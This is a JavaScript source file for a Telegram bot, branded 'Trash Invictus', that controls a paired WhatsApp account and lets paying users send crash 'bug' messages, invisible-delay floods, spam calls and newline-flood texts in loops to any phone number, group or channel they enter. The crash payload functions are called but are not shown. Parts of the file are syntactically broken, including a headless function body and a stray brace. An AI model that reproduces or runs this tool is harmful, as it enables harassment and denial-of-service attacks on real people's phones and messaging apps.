const fs = require('fs');
const { default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification,MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys');
const P = require('pino');
const JsConfuser = require('js-confuser');
const CrashVamp = fs.readFileSync('./Vampire.jpeg')
const crypto = require('crypto');
const chalk = require('chalk');
const global = require('./VampConfig.js');
const Boom = require('@hapi/boom');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(global.botToken, { polling: true });
let superVip = JSON.parse(fs.readFileSync('./VampDB/superVip.json'));
let premiumUsers = JSON.parse(fs.readFileSync('./VampDB/premium.json'));
let OwnerUsers = JSON.parse(fs.readFileSync('./VampDB/Owner.json'));
let adminUsers = JSON.parse(fs.readFileSync('./VampDB/admin.json'));
let bannedUser = JSON.parse(fs.readFileSync('./VampDB/banned.json'));
let securityUser = JSON.parse(fs.readFileSync('./VampDB/security.json'));
const owner = global.owner;
const cooldowns = new Map();
const axios = require('axios');
const BOT_TOKEN = global.botToken; // Kalau token ada di VampireConfig.js
const startTime = new Date(); // Waktu mulai online

// Fungsi untuk menghitung durasi online dalam format jam:menit:detik
function getOnlineDuration() {
  let onlineDuration = new Date() - startTime; // Durasi waktu online dalam milidetik

  // Convert durasi ke format jam:menit:detik
  let seconds = Math.floor((onlineDuration / 1000) % 60); // Detik
  let minutes = Math.floor((onlineDuration / (1000 * 60)) % 60); // Menit
  let hours = Math.floor((onlineDuration / (1000 * 60 * 60)) % 24); // Jam

  return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
}

function updateMenuBot() {
  const message = `${getOnlineDuration()}`;

  updateBotMenu(message);
}

function updateBotMenu(message) {
}

setInterval(() => {
  updateMenuBot();
}, 1000);

  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("LU SIAPA NGENTOT!!!\nTOKEN LU GAK ADA DI DATABASE:", error.message));
    return [];
  }
}

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VampireP6D/LalapoDB/refs/heads/main/LalapoPrivate.json"; // Ganti dengan URL GitHub yang benar

async function validateToken() {
  console.log(chalk.blue("Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token Tidak Di Terima Oleh Bot!!!"));
    process.exit(1);
  }

  console.log(chalk.green("Token Anda Di Kenali Vampire!!!"));
  startBot();
}

function startBot() {
  console.log(chalk.green("Token Kamu Sudah Di Confirm Oleh Vampire!!!"));
}

validateToken();

let sock;
let whatsappStatus = false;
}}*/
async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
        const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
        console.log(`Disconnected. Reason: ${reason}`);

        if (reason && (reason >= 500 && reason < 600 || reason === 428 || reason === 408 || reason === 429)) {
            whatsappStatus = false;
            if (typeof bot !== 'undefined' && chatId && number) {
                await getSessions(bot, chatId, number);
            }
        } else {
            whatsappStatus = false;
        }
    } else if (connection === 'open') {
        whatsappStatus = true;
        console.log('Connected to WhatsApp!');
    }
  });
}

async function getSessions(bot, chatId, number) {
  if (!bot || !chatId || !number) {
      console.error('Error: bot, chatId, atau number tidak terdefinisi!');
      return;
  }

  const { state, saveCreds } = await useMultiFileAuthState('VampirePrivate');
  sock = makeWASocket({
      auth: state,
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
  });

  sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'close') {
          const reason = lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
          if (reason && reason >= 500 && reason < 600) {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor ini ${number} \nTelah terputus dari WhatsApp.`);
              await getSessions(bot, chatId, number);
          } else {
              whatsappStatus = false;
              await bot.sendMessage(chatId, `Nomor Ini : ${number} \nTelah kehilangan akses\nHarap sambungkan kembali.`);
              if (fs.existsSync('./VampirePrivate/creds.json')) {
                  fs.unlinkSync('./VampirePrivate/creds.json');
              }
          }
      } else if (connection === 'open') {
          whatsappStatus = true;
          bot.sendMessage(chatId, `Nomor ini ${number} \nBerhasil terhubung oleh Bot.`);
      }

      if (connection === 'connecting') {
          await new Promise(resolve => setTimeout(resolve, 1000));
          try {
              if (!fs.existsSync('./VampirePrivate/creds.json')) {
                  const formattedNumber = number.replace(/\D/g, '');
                  const pairingCode = await sock.requestPairingCode(formattedNumber);
                  const formattedCode = pairingCode?.match(/.{1,4}/g)?.join('-') || pairingCode;
                  bot.sendMessage(chatId, `
╭──────「 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝗼𝗱𝗲 」──────╮
│➻ Nᴜᴍʙᴇʀ : ${number}
│➻ Pᴀɪʀɪɴɢ ᴄᴏᴅᴇ : ${formattedCode}
╰───────────────────────╯`);
              }
          } catch (error) {
              bot.sendMessage(chatId, `Nomor mu tidak Valid : ${error.message}`);
          }
      }
  });

  sock.ev.on('creds.update', saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync('./VampDB/premium.json', JSON.stringify(premiumUsers, null, 2));
}
function saveOwnerUsers() {
  fs.writeFileSync('./VampDB/Owner.json', JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync('./VampDB/admin.json', JSON.stringify(adminUsers, null, 2));
}
function saveVip() {
  fs.writeFileSync('./VampDB/superVip.json', JSON.stringify(superVip, null, 2));
}
function saveBanned() {
  fs.writeFileSync('./VampDB/banned.json', JSON.stringify(bannedUser, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
      if (eventType === 'change') {
          try {
              const updatedData = JSON.parse(fs.readFileSync(filePath));
              updateCallback(updatedData);
              console.log(`File ${filePath} updated successfully.`);
          } catch (error) {
              console.error(`Error updating ${filePath}:`, error.message);
          }
      }
  });
}
watchFile('./VampDB/premium.json', (data) => (premiumUsers = data));
watchFile('./VampDB/admin.json', (data) => (adminUsers = data));
watchFile('./VampDB/banned.json', (data) => (bannedUser = data));
watchFile('./VampDB/superVip.json', (data) => (superVip = data));
watchFile('./VampDB/security.json', (data) => (securityUser = data));
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
async function spamcall(target) {
    // Inisialisasi koneksi dengan makeWASocket
    const sock = makeWASocket({
        printQRInTerminal: false, // QR code tidak perlu ditampilkan
    });

    try {
        console.log(`📞 Mengirim panggilan ke ${target}`);

        // Kirim permintaan panggilan
        await sock.query({
            tag: 'call',
            json: ['action', 'call', 'call', { id: `${target}` }],
        });

        console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
    } catch (err) {
        console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
    } finally {
        sock.ev.removeAllListeners(); // Hapus semua event listener
        sock.ws.close(); // Tutup koneksi WebSocket
    }
}

async function VampireIOS(target) {
for (let i = 0; i < 10; i++) {
await VampireCrashiPhone(target);
await VampireiPhone(target);
await VampireInvisIphone(target);
await VampireBlankIphone(target);
await VampireSupIos(target);
}
};
async function VampOri(target) {
    for (let i = 0; i <= 50; i++) {
    await VampireBlank(target, Ptcp = true)
    await VampireBlank(target, Ptcp = true)
    }

}
async function VampDelayInvis(target) {
    for (let i = 0; i <= 80; i++) {
    await VampBroadcast(target, mention = true)
    await VampBroadcast(target, mention = true)
    }

}
async function VampBeta(target) {
    for (let i = 0; i <= 80; i++) {
    await VampDeviceCrash(target, Ptcp = true)
    await VampDeviceCrash(target, Ptcp = true)
    }

}
async function VampCrashChat(target) {
    for (let i = 0; i <= 100; i++) {
    await VampDelayMess(target, Ptcp = true)
    await VampDelayMess(target, Ptcp = true)
    }

}
async function VampCrashUi(target) {
    for (let i = 0; i <= 100; i++) {
    await VampireSpamNotif(target, Ptcp = true)
    await VampireNewUi(target, Ptcp = true)
    }

}
async function VampiPhone(target) {
    for (let i = 0; i <= 5; i++) {
    await VampireIOS(target);
    }

}
async function VampChannel(target) {
    for (let i = 0; i <= 5; i++) {
    await VampCrashCH(target)
    await VampCrashCH2(target)
    }

}
async function VampGroup(groupJid) {
    for (let i = 0; i <= 5; i++) {
    await VampireBugIns(groupJid)
    }

}
async function callbug(target) {
  for (let i = 0; i <= 5; i++) {
    await spamcall(target);
    await sleep(3000)
  }
}
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;

  // Ambil tanggal sekarang
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;

  let ligma = `
𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭──────────────────────╮
│        「     𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮    」
╰──────────────────────╯
`;

  bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐁𝐮𝐠 𝐌𝐞𝐧𝐮",
                      callback_data: "bugmenu"
                  },
                  {
                      text: "〢𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
                      callback_data: "ownermenu"
                  }
              ],
              [
                  {
                      text: "〢𝐓𝐨𝐨𝐥𝐬",
                      callback_data: "toolsmenu"
                  }
              ],
              [
                  {
                      text: "〢𝐂𝐡𝐚𝐧𝐧𝐞𝐥",
                      url: "https://t.me/informasiscsalzcrash"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/bugmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭────── 「   𝐁𝐮𝐠 𝐌𝐞𝐧𝐮   」 ──────╮
│➥ /vampori 62×××
│➥ /vampbeta 62×××
│➥ /vampbussines 62×××
│➥ /vampios 62×××
│➥ /vampdelay 62×××
│➥ /vampui 62×××
╰──────────────────────╯
╭──「  𝐁𝐮𝐠 𝐆𝐫𝐨𝐮𝐩/𝐂𝐡𝐚𝐧𝐧𝐞𝐥  」──╮
│➢ /vampgroup <Link>
│➢ /vampch <Newsletter>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/informasiscsalzcrash"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/ownermenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭─────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」─────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "༽𝗢𝘄𝗻𝗲𝗿༼",
                      url: "https://t.me/informasiscsalzcrash"
                  }
              ]
          ]
      }
  });
});
bot.onText(/\/toolsmenu/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `@${msg.from.username}` : `${senderId}`;
  const now = new Date();
  const tanggal = `${now.getDate()} - ${now.toLocaleString('id-ID', { month: 'long' })} - ${now.getFullYear()}`;
  let ligma = `
𖤊───⪩  𝗧𝗥𝗔𝗦𝗛 𝗜𝗡𝗩𝗜𝗖𝗧𝗨𝗦 𝗩𝟭.𝟭 𝗣𝗥𝗢  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @SALZz_botz
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
│➼ Tᴀɴɢɢᴀʟ : ${tanggal}
╰──────────────────────╯
╭─────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」──────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
  bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/SALZz_botz"
                  }
              ]
          ]
      }
  });
});
//========================================================\\ 
bot.onText(/\/addbot(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌Lu Bukan Owner Tolol!!!")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Salah \nContoh : /addbot 62×××.");
}
const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Contoh : /addbot 62×××.");
}

await getSessions(bot, chatId, numberTarget)
});

bot.onText(/^\/fixedbug\s+(.+)/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;
    
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, 'Lu Gak Punya Access Tolol...');
    }

    const q = match && match[1] ? match[1].trim() : null;
    if (!q) {
        return bot.sendMessage(chatId, `Cara Pakai Nih Njing!!!\nContoh: /fixedbug 62xxx`);
    }

    let pepec = q.replace(/[^0-9]/g, "");
    if (!pepec.startsWith("62")) {
        return bot.sendMessage(chatId, `Contoh : /fixedbug 62xxx`);
    }

    const target = `${pepec}@s.whatsapp.net`;
    const clearBugText = "𝐓𝐑𝐀𝐒𝐇 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n" + "\n".repeat(300) + "𝐓𝐑𝐀𝐒𝐇 𝐈𝐍𝐕𝐈𝐂𝐓𝐔𝐒 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆";

    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, { text: clearBugText });
        }
        bot.sendMessage(chatId, "Done Clear Bug By Trash Invictus!!!");
    } catch (err) {
        console.error("Error:", err);
        bot.sendMessage(chatId, "Ada kesalahan saat mengirim bug.");
    }
});
bot.onText(/\/cooldown (\d+)m/i, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Pastikan hanya owner yang bisa mengatur cooldown
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Lu Siapa Ngentot...\nGak ada hak gunain fitur ini");
  }

  // Pastikan match[1] ada dan valid
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam format angka diikuti 'm'. Contoh: /cooldown 10m");
  }

  const newCooldown = parseInt(match[1], 10);
  if (isNaN(newCooldown) || newCooldown <= 0) {
    return bot.sendMessage(chatId, "❌ Masukkan waktu cooldown yang valid dalam menit.");
  }

  cooldownTime = newCooldown * 60; // Ubah ke detik
  return bot.sendMessage(chatId, `✅ Cooldown time successfully set to ${newCooldown} menit.`);
});
bot.onText(/\/vampori(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /vampori 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampori 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim pesan awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampDelayInvis(formatedNumber);
    }

    // Kirim pesan setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampori
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampbeta(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 5; i++) { // Kirim 3 kali langsung
        await VampBeta(formatedNumber);
        await VampDelayInvis(formatedNumber);
    }

    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampbussines(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
        await VampDelayInvis(formatedNumber);
        await VampDelayInvis(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /vampbeta
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampios(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Harap Hubungkan Nomor WhatsApp Anda.");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /vampbeta 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /vampios 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/wfhaut.webp", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    // Proses pengiriman bug
    for (let i = 0; i < 2; i++) { // Kirim 3 kali langsung
        await VampiPhone(formatedNumber);
        await VampCrashUi(formatedNumber);
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /trashios
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vampdelay(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /trashdelay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampblank 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://files.catbox.moe/f33mbl.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
